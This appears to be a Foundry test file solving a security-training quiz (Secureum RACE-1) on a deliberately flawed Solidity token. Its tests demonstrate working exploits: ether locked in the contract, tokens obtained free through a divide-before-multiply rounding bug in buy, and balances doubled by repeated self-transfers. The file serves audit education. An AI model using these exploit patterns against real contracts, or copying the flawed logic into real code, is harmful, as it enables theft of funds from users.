// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
pragma abicoder v2;

import { Test, console } from "forge-std/Test.sol";
import { InSecureumToken } from "../src/Race1.sol";

contract InSecureumTokenTestBase is Test {
    InSecureumToken token;
    function setUp() public {
        token = new InSecureumToken();
    }
}

contract R1_Q1 is InSecureumTokenTestBase {
    function test_lockedEther() public {
        // buy 10 tokens
        token.buy{value: 1 ether}(10);

        assertEq(token.balances(address(this)), 10);

        assertEq(address(token).balance, 1 ether);

        /* 
        The only public functions available on the token are
        
        token.buy(desired_tokens);
        already used in this test. only send ether TO the contract.
        
        token.safeAdd(a, b);
        this is a pure function so cannot be used to transfer ether

        token.transfer(to, amount);
        the transfer function only performs internal accounting 
        and does not transfer ether out of the contract

        Since there are no more public functions available the 
        Ether is therefore locked in the contract!
        */ 
    }
}

// NOTE Q2, Q2 and Q3 do not require tests, moving to Q4 below:

contract R1_Q4 is InSecureumTokenTestBase {
    function test_UnsafeRoundingAllowsUsersToReceiveTokensForFree() public {
        /*
            In the `InSecureumToken` contract `buy` function it divides `desired_tokens` first 
            and only then multiplies by the decimals, this causes any amount of tokens below 10 
            to result in 0 required_wei_sent.
        */
        // request to buy 9 tokens (without sending any Ether value)
        token.buy(9);
        // tokens received (without paying for them)
        assertEq(token.balances(address(this)), 9);
        // confirmed the token contract has not received any ether. Token ccontract balance is still 0 ether.
        assertEq(address(token).balance, 0);
    }
}

contract R1_Q5 is InSecureumTokenTestBase {
    function test_IncorrectBalanceUpdateAllowsOneToReceiveNewTokensForFree() public {
        /*
            A user can send all of their tokens to themselve, which will double their 
            balance due to the pre-loaded variable reuse.
        */
        
        // buy 10 tokens
        token.buy{value: 1 ether}(10);

        assertEq(token.balances(address(this)), 10);

        token.transfer(address(this), 10);

        assertEq(token.balances(address(this)), 20);

        // keep going
        token.transfer(address(this), 20);
        assertEq(token.balances(address(this)), 40);
        
        // etc...
    }
}